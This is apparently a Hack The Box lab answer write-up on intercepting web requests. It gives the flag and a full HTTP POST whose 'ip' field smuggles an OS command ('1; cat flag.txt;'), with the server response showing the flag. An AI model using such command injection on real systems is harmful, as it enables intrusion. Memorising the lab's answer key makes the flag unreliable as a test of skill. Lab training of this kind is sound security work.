# Intercepting Web Requests
## Questions
1. Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt' **Answer: HTB{1n73rc3p73d_1n_7h3_m1ddl3}** 
   - Send this request and obtain the flag via OS command injection:
    ```
    POST /ping HTTP/1.1
    Host: 154.57.164.81:30781
    Content-Length: 19
    Cache-Control: max-age=0
    Accept-Language: en-US,en;q=0.9
    Origin: http://154.57.164.81:30781
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://154.57.164.81:30781/
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive

    ip=1; cat flag.txt;
    ```
    ```
    HTTP/1.1 200 OK
    X-Powered-By: Express
    Date: Thu, 07 May 2026 08:17:56 GMT
    Connection: keep-alive
    Content-Length: 282

    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.076 ms

    --- 127.0.0.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 0.076/0.076/0.076/0.000 ms
    HTB{1n73rc3p73d_1n_7h3_m1ddl3}
    ```